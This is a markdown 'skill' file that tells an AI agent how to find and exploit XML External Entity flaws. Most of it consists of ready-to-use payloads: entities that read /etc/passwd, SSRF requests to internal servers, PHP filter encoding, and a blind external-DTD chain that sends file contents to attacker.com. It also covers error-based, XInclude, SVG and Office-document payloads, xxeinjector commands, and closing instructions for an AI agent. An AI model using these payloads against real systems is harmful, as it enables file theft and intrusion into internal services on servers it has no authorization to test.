# XML External Entity (XXE) Injection Skill

## Goal

Identify and exploit XXE vulnerabilities to read files, perform SSRF, or achieve remote code execution.

## Methodology

1. **Identify XML Parsers:** Find endpoints that accept XML input (APIs, file uploads, SOAP)
2. **Test Entity Definition:** Inject a basic entity to confirm parsing
3. **Read Local Files:** Use SYSTEM entities to read server files
4. **Perform SSRF:** Access internal services via XXE
5. **Escalate:** Try blind XXE with out-of-band exfiltration

## Basic XXE Payloads

### File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server:8080/admin">]>
<data>&xxe;</data>
```

### PHP Filter (Base64 encode)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<data>&xxe;</data>
```

## Blind XXE with External DTD

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<data>test</data>
```

**evil.dtd on attacker server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

## Error-Based XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<data>test</data>
```

## XInclude Attack
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## SVG XXE (File Upload)
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

## Office Document XXE
```bash
# Unzip DOCX/XLSX, modify [Content_Types].xml or other XML files
unzip document.docx -d doc_unzipped
# Add XXE payload to XML files
zip -r malicious.docx doc_unzipped/*
```

## Tools

* **XXEinjector** - Automated XXE exploitation
* **Burp Suite** - Manual XXE testing
* **oxml_xxe** - Office document XXE generator

## Example Commands

```bash
# Start HTTP server to receive OOB data
python -m http.server 8080

# Generate XXE payloads
xxeinjector --host attacker.com --port 8080 --file /etc/passwd
```

## Guidance for AI

* Activate when testing endpoints that parse XML (SOAP, REST with XML, file uploads)
* Start with basic entity test before advanced exfiltration
* Use PHP filters for base64 encoding when file contains special chars
* For blind XXE, host external DTD and check for HTTP callbacks
* SVG files are often overlooked XXE vectors in image uploads
* Modern XML parsers often disable external entities by default
* Check for XInclude when DOCTYPE is blocked
